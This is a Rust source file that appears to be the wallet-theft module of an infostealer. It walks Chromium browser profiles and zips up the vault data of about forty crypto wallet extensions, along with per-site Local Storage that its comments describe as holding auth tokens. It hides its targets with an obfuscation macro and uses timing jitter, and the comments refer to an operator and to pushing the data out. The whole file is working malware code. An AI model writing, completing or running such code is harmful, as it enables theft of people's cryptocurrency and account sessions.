//! Tier 2: browser extension vaults — crypto wallets only.
//! Copies each profile's wallet extension leveldb dirs into the zip nested
//! under the browser dir: Browser_<Name>_<Profile>/<ExtensionName>/Local
//! Extension Settings/<extId>/... and writes root BrowserExtensions.json.
//! Password managers, 2FA apps, and unknown extensions are skipped entirely
//! (operator decision: only wallet vaults justify the transfer weight).
//! Also sweeps per-site Local Storage leveldb (auth tokens) — IndexedDB and
//! Session Storage are excluded by operator decision (bloat, near-zero value).

use std::panic::{catch_unwind, AssertUnwindSafe};

use crate::chromium::{browser_roots, profiles};
use crate::fsutil;
use crate::info::Info;
use crate::zipw::ZipBuilder;

const MAX_FILE: u64 = 4 * 1024 * 1024;

/// Well-known crypto wallet extension IDs → display names. Every ID was
/// verified against the Chrome Web Store URL or a public threat-research
/// target list. IDs are obfuscated at rest and decoded per lookup; display
/// names are zip output content. Non-wallet extensions are never collected.
fn wallet_extension_name(id: &str) -> Option<&'static str> {
    let pairs: Vec<(String, &'static str)> = vec![
        (crate::obf!("nkbihfbeogaeaoehlefnkodbefgpgknn"), "MetaMask"),
        (crate::obf!("bfnaelmomeimhlpmgjnjophhpkkoljpa"), "Phantom"),
        (crate::obf!("hnfanknocfeofbddgcijnmhnfnkdnaad"), "Coinbase Wallet"),
        (crate::obf!("egjidjbpglichdconbcgcnmaebhcmoap"), "Trust Wallet"),
        (crate::obf!("egjidjbpglichdcondbcbdnbeeppgdph"), "Trust Wallet"),
        (crate::obf!("acmacodkjbdgmoleebolmdjonilkdbch"), "Rabby"),
        (crate::obf!("mcohilncbfahbmgdjkbpemcciiolgcge"), "OKX Wallet"),
        (crate::obf!("pdliaogehgdbhbnmkklieghmmjkpigpa"), "Bybit"),
        (crate::obf!("fhbohimaelbohpjbbldcngcnapndodjp"), "Binance Wallet"),
        (crate::obf!("cadiboklkpojfamcoggejbbdjcoiljjk"), "Binance Wallet"),
        (crate::obf!("hifafgmccdpekplomjjkcfgodnhcellj"), "Crypto.com Onchain"),
        (crate::obf!("jiidiaalihmmhddjgbnbgdfflelocpak"), "Bitget Wallet"), // formerly BitKeep
        (crate::obf!("aholpfdialjgjfhomihkjbmgjidlcdno"), "Exodus"),
        (crate::obf!("hpglfhgfnhbgpjdenjgmdgoeiappafln"), "Guarda"),
        (crate::obf!("hmeobnfnfcmdkdcmlblgagmfpfboieaf"), "Ctrl Wallet"),
        (crate::obf!("kkpllkodjeloidieedojogacfhpaihoh"), "Enkrypt"),
        (crate::obf!("lgmpcpglpngdoalbgeoldeajfclnhafa"), "SafePal"),
        (crate::obf!("bhhhlbepdkbapadjdnnojkbgioiodbic"), "Solflare"),
        (crate::obf!("aflkmfhebedbjioipglgcbcmnbpgliof"), "Backpack"),
        (crate::obf!("klghhnkeealcohjjanjjdaeeggmfmlpl"), "Zerion"),
        (crate::obf!("dmkamcknogkgcdfhhbddcghachkejeap"), "Keplr"),
        (crate::obf!("fcfcfllfndlomdhbehjjcoimbgofdncg"), "Leap"),
        (crate::obf!("fpkhgmpbidmiogeglndfbkegfdlnajnf"), "Cosmostation"),
        (crate::obf!("aiifbnbfobpmeekipheeijimdpnlpgpp"), "Station"),
        (crate::obf!("ejjladinnckdgjemekebdpeokbikhfci"), "Petra"),
        (crate::obf!("efbglgofoippbgcjepnhiblaibcnclgk"), "Martian"),
        (crate::obf!("opcgpfmipidbgpenhmajoajpbobppdil"), "Slush"), // formerly Sui Wallet
        (crate::obf!("khpkpbbcccdmmclmpigdgddabeilkdpd"), "Suiet"),
        (crate::obf!("ibnejdfjmmkpcnlpebklmnkoeoihofec"), "TronLink"),
        (crate::obf!("ldinpeekobnhjjdofggfgjlcehhmanlj"), "Leather"),
        (crate::obf!("opfgelmcmbiajamepnmloijbpoleiama"), "Rainbow"),
        (crate::obf!("aeachknmefphepccionboohckonoeemg"), "Coin98"),
        (crate::obf!("nnpmfplkfogfpmcngplhnbdnnilmcdcg"), "Uniswap"),
        (crate::obf!("mfgccjchihfkkindfppnaooecgfneiii"), "TokenPocket"),
        (crate::obf!("afbcbjpbpfadlkmhmclhkeeodmamcflc"), "MathWallet"),
        (crate::obf!("agoakfejjabomempkjlepdflaleeobhb"), "Core"),
        (crate::obf!("dlcobpjiigpikoobohmabehhmhfoodbb"), "Ready Wallet"), // formerly Argent X
        (crate::obf!("jnlgamecbpmbajjfhmmmlhejkemejdma"), "Braavos"),
        (crate::obf!("fldfpgipfncgndfolcbkdeeknbbbnhcc"), "MyTonWallet"),
        (crate::obf!("fnjhmkhhmkbjkkabndcnnogagogbneec"), "Ronin"),
        (crate::obf!("kppfdiipphfccemcignhifpjkapfbihd"), "Frontier"),
    ];
    pairs
        .into_iter()
        .find(|(ext_id, _)| ext_id == id)
        .map(|(_, name)| name)
}

pub fn collect(zip: &mut ZipBuilder, info: &mut Info) {
    let mut manifest: Vec<serde_json::Value> = Vec::new();
    for (browser, user_data) in browser_roots() {
        crate::jitter::sleep_jitter(20, 80);
        for (profile, pdir) in profiles(&user_data) {
            crate::jitter::sleep_jitter(20, 80);
            for kind in [
                crate::obf!("Local Extension Settings"),
                crate::obf!("Sync Extension Settings"),
            ] {
                let _ = catch_unwind(AssertUnwindSafe(|| {
                    collect_settings_dir(
                        zip,
                        info,
                        &mut manifest,
                        &browser,
                        &profile,
                        &pdir.join(&kind),
                        &kind,
                    );
                }));
            }
            // Per-site storage: plain copies, no parsing, no manifest entry.
            let _ = catch_unwind(AssertUnwindSafe(|| {
                let zip_base = format!("Browser_{}_{}", browser, profile);
                for (sub, zip_sub) in [
                    (crate::obf!("Local Storage\\leveldb"), "Local Storage"),
                ] {
                    // 512 KB cap: auth tokens are small leveldb entries;
                    // multi-MB .ldb blobs are site-cache bloat.
                    copy_tree_capped(zip, &pdir.join(sub), &format!("{}/{}", zip_base, zip_sub), 512 * 1024);
                }
            }));
        }
    }
    if !manifest.is_empty() {
        if let Ok(body) = serde_json::to_vec_pretty(&manifest) {
            // Match the other JSON artifacts: UTF-8 BOM first.
            let mut bytes = Vec::with_capacity(body.len() + 3);
            bytes.extend_from_slice(b"\xef\xbb\xbf");
            bytes.extend_from_slice(&body);
            zip.add_file("BrowserExtensions.json", &bytes);
        }
    }
}

/// Copy every file under `src_root` into the zip at `zip_base/<relpath>`.
/// Silent skips for missing dirs, unreadable files, oversized files.
fn copy_tree(zip: &mut ZipBuilder, src_root: &std::path::Path, zip_base: &str) {
    copy_tree_capped(zip, src_root, zip_base, MAX_FILE)
}

/// Same, with a per-file size cap override (site Local Storage gets a tight
/// cap: auth tokens live in small leveldb entries; multi-MB .ldb blobs are
/// site junk that stalls slow pushes).
fn copy_tree_capped(zip: &mut ZipBuilder, src_root: &std::path::Path, zip_base: &str, max_file: u64) {
    let mut files = Vec::new();
    fsutil::walk_files(src_root, max_file, &mut files);
    for (file, _) in &files {
        let Some(data) = fsutil::read_file(file) else {
            continue;
        };
        let rel = match file.strip_prefix(src_root) {
            Ok(r) => r.to_string_lossy().replace('\\', "/"),
            Err(_) => continue,
        };
        zip.add_file(&format!("{}/{}", zip_base, rel), &data);
    }
}

fn collect_settings_dir(
    zip: &mut ZipBuilder,
    info: &mut Info,
    manifest: &mut Vec<serde_json::Value>,
    browser: &str,
    profile: &str,
    dir: &std::path::Path,
    kind: &str,
) {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };
    for entry in entries.flatten() {
        let ext_dir = entry.path();
        if !ext_dir.is_dir() {
            continue;
        }
        let id = entry.file_name().to_string_lossy().into_owned();
        // Wallets only — password managers, 2FA, and unknown extensions are
        // skipped entirely (no copy, no manifest entry).
        let Some(name) = wallet_extension_name(&id) else {
            continue;
        };
        let mut files = Vec::new();
        fsutil::walk_files(&ext_dir, MAX_FILE, &mut files);
        if files.is_empty() {
            continue;
        }
        let base = format!(
            "Browser_{}_{}/{}/{}/{}",
            browser, profile, name, kind, id
        );
        let mut wrote = false;
        for (file, _) in &files {
            let Some(data) = fsutil::read_file(file) else {
                continue;
            };
            let rel = match file.strip_prefix(&ext_dir) {
                Ok(r) => r.to_string_lossy().replace('\\', "/"),
                Err(_) => continue,
            };
            zip.add_file(&format!("{}/{}", base, rel), &data);
            wrote = true;
        }
        if wrote {
            info.add_extension(&name);
            manifest.push(serde_json::json!({
                "browser": browser,
                "profile": profile,
                "extension": name,
                "id": id,
            }));
        }
    }
}
